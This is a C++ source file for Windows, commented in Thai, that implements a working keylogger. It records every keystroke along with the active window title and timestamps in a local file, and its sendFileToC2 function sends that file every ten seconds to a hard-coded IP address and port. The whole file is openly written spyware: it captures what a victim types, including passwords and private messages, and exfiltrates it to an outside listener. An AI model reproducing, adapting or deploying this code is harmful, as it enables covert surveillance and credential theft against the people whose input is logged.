#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <set>
#include <sstream>    // เพิ่มเข้ามาเพื่อใช้ Buffer
#include <chrono>     // เพิ่มเข้ามาเพื่อจัดการเวลา
#include <iomanip>    // เพิ่มเข้ามาเพื่อจัดรูปแบบเวลา
#pragma comment(lib, "ws2_32.lib")

// ฟังก์ชันสำหรับดึงเวลาปัจจุบันในรูปแบบที่สวยงาม
std::string GetCurrentTimestamp() {
    auto now = std::chrono::system_clock::now();
    auto in_time_t = std::chrono::system_clock::to_time_t(now);
    std::stringstream ss;
    ss << std::put_time(std::localtime(&in_time_t), "%Y-%m-%d %X"); // รูปแบบ: YYYY-MM-DD HH:MM:SS
    return ss.str();
}

// ฟังก์ชัน GetActiveWindowTitle ใช้เหมือนเดิม
std::string GetActiveWindowTitle() {
    char windowTitle[256];
    HWND hwnd = GetForegroundWindow();
    if (hwnd != NULL) {
        GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));
        return std::string(windowTitle);
    }
    return "Unknown";
}

//   นี่คือฟังก์ชันเวอร์ชันที่แก้ไขสมบูรณ์และแน่นอนที่สุด
std::string GetKeyString(UINT keyCode) {
    switch (keyCode) {
        case VK_RETURN: return "[Enter]\n";
        case VK_SPACE:  return " ";
        case VK_BACK:   return "[Backspace]";
        case VK_TAB:    return "[Tab]";
        case VK_ESCAPE: return "[Esc]";
        
        // เราจะไม่ดักจับ Shift, Ctrl, Alt ที่นี่เลย เพื่อให้ ToUnicodeEx จัดการทั้งหมด fdsfdsfdsfdsfsdf
        // case VK_LSHIFT: case VK_RSHIFT:
        case VK_LCONTROL: case VK_RCONTROL: return "[Ctrl]";
        case VK_MENU: return "[Alt]";
    }

    BYTE keyboardState[256];
    // ดึงสถานะพื้นฐานมาก่อน
    GetKeyboardState(keyboardState);

    //  FIX: บังคับให้สถานะของปุ่ม Modifier ถูกต้อง 100%
    // โดยใช้ GetAsyncKeyState ที่ให้ผลแบบ Real-time มาช่วย
    // การตั้งค่าบิต 0x80 หมายถึง "ปุ่มกำลังถูกกด"
    if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
        keyboardState[VK_SHIFT] = 0x80;
    }
    if (GetAsyncKeyState(VK_LSHIFT) & 0x8000) {
        keyboardState[VK_LSHIFT] = 0x80;
    }
    if (GetAsyncKeyState(VK_RSHIFT) & 0x8000) {
        keyboardState[VK_RSHIFT] = 0x80;
    }
    if (GetAsyncKeyState(VK_CONTROL) & 0x8000) {
        keyboardState[VK_CONTROL] = 0x80;
    }
    if (GetAsyncKeyState(VK_LCONTROL) & 0x8000) {
        keyboardState[VK_LCONTROL] = 0x80;
    }
    if (GetAsyncKeyState(VK_RCONTROL) & 0x8000) {
        keyboardState[VK_RCONTROL] = 0x80;
    }
    if (GetAsyncKeyState(VK_MENU) & 0x8000) {
        keyboardState[VK_MENU] = 0x80;
    }

    // ส่วนนี้จะจัดการแปลงเป็นตัวพิมพ์ใหญ่และอักษรพิเศษให้เอง
    // HWND hwnd = GetForegroundWindow();
    // DWORD threadID = GetWindowThreadProcessId(hwnd, NULL);
    // HKL layout = (threadID != 0) ? GetKeyboardLayout(threadID) : GetKeyboardLayout(0);

    WCHAR buffer[5];
    int result = ToUnicodeEx(keyCode, MapVirtualKey(keyCode, MAPVK_VK_TO_VSC), keyboardState, buffer, 4, 0, GetKeyboardLayout(0));
    if (result > 0) {
        buffer[result] = '\0';
        char output[5];
        WideCharToMultiByte(CP_UTF8, 0, buffer, -1, output, 5, NULL, NULL);
        return std::string(output);
    }
    return "";
}

void sendFileToC2(const std::string& filepath, const std::string& ip, int port) {
    std::ifstream file(filepath, std::ios::binary);
    if (!file.is_open()) return;

    // โหลดเนื้อหาไฟล์
    file.seekg(0, std::ios::end);
    int size = file.tellg();
    file.seekg(0, std::ios::beg);
    char* buffer = new char[size];
    file.read(buffer, size);
    file.close();

    // เริ่มเชื่อมต่อ
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip.c_str());

    if (connect(sock, (sockaddr*)&server, sizeof(server)) != SOCKET_ERROR) {
        send(sock, buffer, size, 0);
    }

    closesocket(sock);
    WSACleanup();
    delete[] buffer;
}

void flushBufferToFile(const std::string& windowTitle, std::stringstream& buffer, const std::string& filepath) {
    if (!buffer.str().empty()) {
        std::ofstream logFile(filepath, std::ios::app);
        if (logFile.is_open()) {
            logFile << "[" << GetCurrentTimestamp() << "] [" << windowTitle << "]\n";
            logFile << buffer.str() << "\n\n";
            logFile.close();
        }
        buffer.str("");
        buffer.clear();
    }
}


int main() {
    const std::string LOG_FILE = "activity_log.txt";
    std::ofstream logFile;
    std::string lastWindow = "";
    std::set<int> pressedKeys;
    std::stringstream keyBuffer; // Buffer สำหรับเก็บคีย์ที่กด

    auto lastSent = std::chrono::steady_clock::now();
    const std::chrono::seconds interval(10); // ส่งทุก 10 วินาที

    while (true) {
        std::string currentWindow = GetActiveWindowTitle();

        if (currentWindow != lastWindow) {
            flushBufferToFile(lastWindow, keyBuffer, LOG_FILE);  // เขียน buffer ลงไฟล์เมื่อหน้าต่างเปลี่ยน
            lastWindow = currentWindow;

            std::ofstream logFile(LOG_FILE, std::ios::app);
            if (logFile.is_open()) {
                logFile << "--- Window Changed to: " << currentWindow << " at " << GetCurrentTimestamp() << " ---\n";
                logFile.close();
            }
        }

        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 0x8000) {
                if (pressedKeys.find(key) == pressedKeys.end()) {
                    std::string out = GetKeyString(key);
                    if (!out.empty()) {
                        keyBuffer << out;
                    }
                    pressedKeys.insert(key);
                }
            } else {
                pressedKeys.erase(key);
            }
        }

        auto now = std::chrono::steady_clock::now();
        if (now - lastSent >= interval) {
            lastSent = now;
            sendFileToC2(LOG_FILE, "192.168.234.206", 5555); // เปลี่ยน IP ตรงนี้
        }

        Sleep(20);
    }

    return 0;
}
